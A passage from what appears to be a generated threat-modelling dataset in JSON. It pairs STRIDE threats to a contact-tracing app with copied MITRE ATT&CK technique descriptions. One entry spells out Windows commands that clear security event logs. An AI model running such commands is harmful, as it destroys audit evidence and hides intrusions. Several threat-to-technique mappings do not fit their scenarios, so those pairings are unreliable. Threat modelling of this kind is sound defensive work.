                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider with developer access embeds backdoors in the application updates.",
            "Assumptions": [
                {
                    "Assumption": "Developer access controls are weak or absent.",
                    "Role": "System Admin",
                    "Condition": "Developer tasks are not tightly controlled or audited."
                },
                {
                    "Assumption": "Code reviews and security audits are inadequate.",
                    "Role": "Development Team",
                    "Condition": "Lack of thorough code review processes."
                },
                {
                    "Assumption": "Insiders have motivation and opportunity to act maliciously.",
                    "Role": "Malicious Actor (Insider)",
                    "Condition": "Insiders are both motivated and capable."
                }
            ],
            "Potential Impact": "Compromise of the application, potential unauthorized data access, and long-term system integrity issues.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "developer access",
                "backdoor",
                "application updates"
            ],
            "mitre_technique": {
                "name": "Masquerade File Type",
                "description": "Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file\u2019s signature, extension, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file\u2019s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file\u2019s type. For example, the header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`. \n\nAdversaries may edit the header\u2019s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001)) so that adversaries may move their malware without triggering detections. \n\nCommon non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of <code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension.\n\nPolygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.(Citation: polygot_icedID)",
                "id": "attack-pattern--208884f1-7b83-4473-ac22-4e1cf6c41471",
                "technique_id": "T1036.008"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "13",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker pretends to be a legitimate user by exploiting weak or missing authentication methods during device pairing.",
            "Assumptions": [
                {
                    "Assumption": "No authentication is required or the existing authentication is weak.",
                    "Role": "User",
                    "Condition": "During device pairing process"
                },
                {
                    "Assumption": "Attacker is within Bluetooth range of the target user.",
                    "Role": "Attacker",
                    "Condition": "Proximity required for spoofing"
                },
                {
                    "Assumption": "The legitimate user\u2019s device is discoverable.",
                    "Role": "User Device",
                    "Condition": "Bluetooth is enabled and device is discoverable"
                }
            ],
            "Potential Impact": "Confidentiality breach, unauthorized access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "bluetooth",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker generates fake temporary IDs and broadcasts them, polluting the central server's database.",
            "Assumptions": [
                {
                    "Assumption": "Application accepts temporary IDs without robust verification.",
                    "Role": "Application",
                    "Condition": "Temporary ID verification"
                },
                {
                    "Assumption": "Attacker has means to broadcast fake IDs widely.",
                    "Role": "Attacker",
                    "Condition": "Control over broadcast mechanism"
                },
                {
                    "Assumption": "System lacks mechanisms to detect and filter out fake IDs.",
                    "Role": "System",
                    "Condition": "Data integrity checks missing"
                }
            ],
            "Potential Impact": "Data integrity compromised, potential inaccurate exposure alerts.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "temporary ID",
                "database",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious application masquerades as the legitimate contact tracing app, tricking users into providing personal information.",
            "Assumptions": [
                {
                    "Assumption": "Users are unable to differentiate between genuine and fake apps.",
                    "Role": "User",
                    "Condition": "Limited technical ability"
                },
                {
                    "Assumption": "App stores do not reliably vet applications.",
                    "Role": "App Store",
                    "Condition": "Weak app review process"
                },
                {
                    "Assumption": "Malicious app has similar appearance and functionality as the legitimate one.",
                    "Role": "Attacker",
                    "Condition": "Clone app creation"
                }
            ],
            "Potential Impact": "Confidentiality breach, unauthorized disclosure of sensitive personal data.",
            "MITRE ATT&CK Keywords": [
                "masquerade",
                "application",
                "personal information",
                "app store"
            ],
            "mitre_technique": {
                "name": "Code Signing",
                "description": "Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries (Citation: Janicab). The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)\n\nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
                "id": "attack-pattern--1b84d551-6de8-4b96-9930-d177677c3b1d",
                "technique_id": "T1116"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data packets exchanged between devices to introduce false contact information.",
            "Assumptions": [
                {
                    "Assumption": "Data packets are not securely encrypted or authenticated.",
                    "Role": "Application",
                    "Condition": "Weak data transmission security"
                },
                {
                    "Assumption": "Attacker has access to the communication channel.",
                    "Role": "Attacker",
                    "Condition": "Network proximity"
                },
                {
                    "Assumption": "No mechanism exists to validate the integrity of exchanged data.",
                    "Role": "System",
                    "Condition": "Lack of data integrity checks"
                }
            ],
            "Potential Impact": "Data integrity and availability compromised, misleading exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data packets",
                "communication",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker gains access to centralized server and alters contact data to hide or create false exposures.",
            "Assumptions": [
                {
                    "Assumption": "Centralized server is not sufficiently secured.",
                    "Role": "Server",
                    "Condition": "Weak defensive measures"
                },
                {
                    "Assumption": "Attacker has server access credentials or exploits vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Access methods"
                },
                {
                    "Assumption": "No auditing or monitoring is in place for detecting such changes.",
                    "Role": "System",
                    "Condition": "Lack of monitoring"
                }
            ],
            "Potential Impact": "Data integrity compromised, incorrect exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "server",
                "contact data",
                "exposure"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker with physical access to a user's device can alter app data or logs to forge exposure history.",
            "Assumptions": [
                {
                    "Assumption": "Device security can be compromised physically.",
                    "Role": "User Device",
                    "Condition": "Physical vulnerability"
                },
                {
                    "Assumption": "Attacker has sufficient time alone with the device to alter data.",
                    "Role": "Attacker",
                    "Condition": "Physical access duration"
                },
                {
                    "Assumption": "App does not encrypt stored data or log files.",
                    "Role": "Application",
                    "Condition": "Weak data encryption"
                }
            ],
            "Potential Impact": "Data integrity compromised, false exposure history.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "device",
                "log files",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Compromise Hardware Supply Chain",
                "description": "Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",
                "id": "attack-pattern--39131305-9282-45e4-ac3b-591d2d4fc3ef",
                "technique_id": "T1195.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having uploaded their rolling keys after testing positive, claiming the server made an unauthorized disclosure.",
            "Assumptions": [
                {
                    "Assumption": "System does not retain verifiable logs of key uploads.",
                    "Role": "System",
                    "Condition": "Lack of logging"
                },
                {
                    "Assumption": "There is no non-repudiation mechanism in place.",
                    "Role": "Application",
                    "Condition": "Non-repudiation inadequacy"
                },
                {
                    "Assumption": "User had access credentials and initiated interaction.",
                    "Role": "User",
                    "Condition": "Access credentials"
                }
            ],
            "Potential Impact": "Repudiation issues, legal or trust implications.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "upload",
                "rolling keys",
                "log retention"
            ],
            "mitre_technique": {
                "name": "Drive-by Target",
                "description": "Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).\n\nAdversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a number of ways, including:\n\n* Inserting malicious scripts into web pages or other user controllable web content such as forum posts\n* Modifying script files served to websites from publicly writeable cloud storage buckets\n* Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))\n\nIn addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox)\n\nWebsites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",
                "id": "attack-pattern--31fe0ba2-62fd-4fd9-9293-4043d84f7fe9",
                "technique_id": "T1608.004"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Healthcare personnel deny responsibility for misreported cases in the centralized system, causing a breakdown in trust.",
            "Assumptions": [
                {
                    "Assumption": "Misreporting could happen via system errors or manual entry issues.",
                    "Role": "System or Personnel",
                    "Condition": "Manual entry or errors"
                },
                {
                    "Assumption": "System fails to track user actions reliably.",
                    "Role": "System",
                    "Condition": "Logging deficiencies"
                },
                {
                    "Assumption": "No audit trail for actions by healthcare personnel.",
                    "Role": "Healthcare Personnel",
                    "Condition": "Lack of audit controls"
                }
            ],
            "Potential Impact": "Repudiation issues, system trust deterioration.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "misreporting",
                "healthcare personnel",
                "system trust"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "User claims they did not receive exposure notification, challenging the system's reliability and accuracy.",
            "Assumptions": [
                {
                    "Assumption": "Notification system might not be fail-safe.",
                    "Role": "System",
                    "Condition": "Notification mechanism"
                },
                {
                    "Assumption": "Mobile application does not log sent notifications.",
                    "Role": "Application",
                    "Condition": "Logging notifications"
                },
                {
                    "Assumption": "User was active and eligible to receive notifications.",
                    "Role": "User",
                    "Condition": "Active user"
                }
            ],
            "Potential Impact": "Repudiation issues, questioning system reliability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "notifications",
                "user claims",
                "system reliability"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized individuals intercept Bluetooth communications to access contact details and proximity data.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth communication is not encrypted.",
                    "Role": "Application",
                    "Condition": "Bluetooth encryption"
                },
                {
                    "Assumption": "Attacker is within range to intercept communications.",
                    "Role": "Attacker",
                    "Condition": "Physical proximity"
                },
                {
                    "Assumption": "Mechanism to detect interception efforts is absent.",
                    "Role": "System",
                    "Condition": "Detection mechanisms"
                }
            ],
            "Potential Impact": "Confidentiality breach, exposure of sensitive proximity data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "bluetooth",
                "intercept",
                "proximity data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Insider with access to centralized database exfiltrates user contact data and sells it.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have unrestricted access to sensitive data.",
                    "Role": "Insider",
                    "Condition": "Access privileges"
                },
                {
                    "Assumption": "No monitoring or auditing to detect unauthorized access.",
                    "Role": "System",
                    "Condition": "Monitoring systems"
                },
                {
                    "Assumption": "Sensitive data is not encrypted at rest.",
                    "Role": "Application",
                    "Condition": "Data encryption"
                }
            ],
            "Potential Impact": "Confidentiality breach, unauthorized disclosure of user contact data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "insider threat",
                "database",
                "user data"
            ],
            "mitre_technique": {
                "name": "Local Data Staging",
                "description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",
                "id": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c",
                "technique_id": "T1074.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Mobile application vulnerability allows remote exploitation, revealing personal information to attackers.",
            "Assumptions": [
                {
                    "Assumption": "App contains exploitable vulnerabilities.",
                    "Role": "Application",
                    "Condition": "Application security"
                },
                {
                    "Assumption": "Remote attackers can access the app.",
                    "Role": "Attacker",
                    "Condition": "Remote access"
                },
                {
                    "Assumption": "No protections in place to prevent exploitation.",
                    "Role": "System",
                    "Condition": "Protection mechanisms"
                }
            ],
            "Potential Impact": "Confidentiality breach, unauthorized access to personal information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "vulnerability",
                "exploitation",
                "personal information"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack on the centralized server disrupts the application's ability to notify users of exposure.",
            "Assumptions": [
                {
                    "Assumption": "Centralized server lacks sufficient DDoS protection.",
                    "Role": "Server",
                    "Condition": "DDoS vulnerability"
                },
                {
                    "Assumption": "High reliance on central server functionality.",
                    "Role": "System",
                    "Condition": "Centralized architecture"
                },
                {
                    "Assumption": "Attacker has capability to launch a DDoS attack.",
                    "Role": "Attacker",
                    "Condition": "DDoS execution"
                }
            ],
            "Potential Impact": "Availability loss, disrupted exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "central server",
                "availability",
                "notification disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious user leverages resource-intensive requests to overload the decentralized service server.",
            "Assumptions": [
                {
                    "Assumption": "Service server not configured for rate limiting.",
                    "Role": "Server",
                    "Condition": "Rate limiting"
                },
                {
                    "Assumption": "Requests do not trigger detection mechanisms.",
                    "Role": "System",
                    "Condition": "Detection algorithms"
                },
                {
                    "Assumption": "Malicious user has means to generate excessive requests.",
                    "Role": "Attacker",
                    "Condition": "Request generation"
                }
            ],
            "Potential Impact": "Availability loss, slow or non-responsive service.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "requests",
                "server",
                "rate limiting"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An exploit in the mobile app\u2019s handling of notifications leads to a crash, preventing exposure alerts.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerability in notification handling is present.",
                    "Role": "Application",
                    "Condition": "Application vulnerabilities"
                },
                {
                    "Assumption": "Attackers can exploit this flaw.",
                    "Role": "Attacker",
                    "Condition": "Exploitation capability"
                },
                {
                    "Assumption": "No fallback mechanism for providing notifications.",
                    "Role": "System",
                    "Condition": "Fallback mechanisms"
                }
            ],
            "Potential Impact": "Availability loss, users do not receive exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "mobile app",
                "notifications",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
